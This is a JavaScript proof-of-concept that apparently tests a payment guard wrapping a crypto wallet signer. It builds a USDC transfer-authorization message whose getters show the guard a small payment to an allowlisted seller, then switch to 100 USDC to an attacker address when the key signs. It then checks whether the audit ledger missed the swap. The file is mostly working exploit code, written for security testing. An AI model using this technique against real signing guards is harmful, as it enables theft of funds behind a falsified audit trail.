/**
 * ATTACK A — TOCTOU on the typed data itself.
 *
 * The wrapper reads `typedData.message.{to,value,...}` to build the intent it
 * asks the guard about, then hands the SAME OBJECT to the real account for
 * hashing. It never snapshots. VadunoGuard's own `run()` does
 * `structuredClone(intent)` for exactly this reason ("a hostile intent could
 * use getters that return a benign value during checks and a malicious one at
 * execution") — the wrapper does not inherit that protection, because it
 * clones the INTENT it built, not the SOURCE it built it from.
 *
 * The switch is TIME-based, not read-count based: extractPayment() is fully
 * synchronous at the top of gatedSignTypedData, and every path to the real
 * signer crosses several awaits (ledger appends). So a flag flipped on the
 * first macrotask is benign for the guard and hostile for the key. No
 * knowledge of read counts required.
 *
 * The wrapper's whole premise is that the caller is untrusted (pay.mjs: "the
 * driver does not get a vote at signing time"). A caller that can pass an
 * object can pass an object with accessors.
 */
import { hashTypedData, recoverTypedDataAddress, getAddress } from "viem";
import { rig, SELLER, USDC, CHAIN_ID, eip3009Types, randomNonce, tag } from "./attack-harness.mjs";

const ATTACKER = getAddress("0xdead00000000000000000000000000000000dead");
const HOSTILE_VALUE = 100_000_000n; // 100 USDC — 2000x the 0.05 per-txn cap
const BENIGN_VALUE = 10_000n; //      0.01 USDC to the allowlisted seller

const { guarded, ledger, realAccount } = rig();

console.log("=== ATTACK A: time-switched accessors on message.{to,value} ===\n");
console.log("guard policy: <= 50000 minor per txn, merchant allowlist = [", SELLER.toLowerCase(), "]\n");

// The flip is driven by the guard's OWN read order, so it needs no timing
// luck. extractPayment() builds idFields left-to-right; `validBefore` is the
// last message field it touches, strictly after its two `value` reads and its
// one `to` read. viem's encoder then re-reads every field. So: flip on the
// first `validBefore` read => the guard saw only benign values, the key sees
// only hostile ones.
let hostile = false;
let vbReads = 0;

const nonce = randomNonce();
const validBefore = BigInt(Math.floor(Date.now() / 1000) + 300);
const message = {
  from: realAccount.address,
  get to() {
    return hostile ? ATTACKER : SELLER;
  },
  get value() {
    return hostile ? HOSTILE_VALUE : BENIGN_VALUE;
  },
  validAfter: 0n,
  get validBefore() {
    if (++vbReads === 1) hostile = true; // guard is done reading; key is next
    return validBefore;
  },
  nonce,
};
const td = {
  domain: { name: "USDC", version: "2", chainId: CHAIN_ID, verifyingContract: USDC },
  types: eip3009Types,
  primaryType: "TransferWithAuthorization",
  message,
};

let sig;
try {
  sig = await guarded.signTypedData(td);
} catch (err) {
  console.log("refused:", tag(err));
  console.log("\nATTACK A FAILED — no signature produced.");
  process.exit(0);
}

console.log("SIGNATURE PRODUCED:", sig);

// What did the key actually commit to? Recover against the HOSTILE payload.
const hostileView = {
  domain: { name: "USDC", version: "2", chainId: CHAIN_ID, verifyingContract: USDC },
  types: eip3009Types,
  primaryType: "TransferWithAuthorization",
  message: {
    from: realAccount.address,
    to: ATTACKER,
    value: HOSTILE_VALUE,
    validAfter: 0n,
    validBefore,
    nonce,
  },
};
const benignView = {
  ...hostileView,
  message: { ...hostileView.message, to: SELLER, value: BENIGN_VALUE },
};

const recHostile = await recoverTypedDataAddress({ ...hostileView, signature: sig }).catch((e) => `n/a (${e.name})`);
const recBenign = await recoverTypedDataAddress({ ...benignView, signature: sig }).catch((e) => `n/a (${e.name})`);

console.log("\nwallet address                 :", realAccount.address);
console.log("recovers under HOSTILE payload :", recHostile);
console.log("recovers under BENIGN payload  :", recBenign);
console.log("hostile digest                 :", hashTypedData(hostileView));

const validForHostile = String(recHostile).toLowerCase() === realAccount.address.toLowerCase();

// What did the guard think it approved, and what did it count?
const entries = await ledger.all();
const intent = entries.find((e) => e.type === "intent_received")?.data?.intent;
const started = entries.find((e) => e.type === "execution_started")?.data;
console.log("\n--- what the AUDIT LEDGER records as the approved payment ---");
console.log("  merchant.id  :", intent?.merchant?.id);
console.log("  amountMinor  :", intent?.amount?.amountMinor, intent?.amount?.currency);
console.log("  description  :", intent?.description);
console.log("  counted spend:", started?.amountMinor, started?.currency, "->", started?.merchantId);
console.log("  ledger verify:", JSON.stringify(await ledger.verify()));
console.log("  ledger entry types:", entries.map((e) => e.type).join(", "));

console.log("\n=== RESULT ===");
console.log("guard approved & counted:", intent?.amount?.amountMinor, "minor ->", intent?.merchant?.id);
console.log("key actually signed     :", HOSTILE_VALUE.toString(), "minor ->", ATTACKER.toLowerCase());
console.log(
  "\nBYPASS:",
  validForHostile && intent?.amount?.amountMinor === Number(BENIGN_VALUE),
);
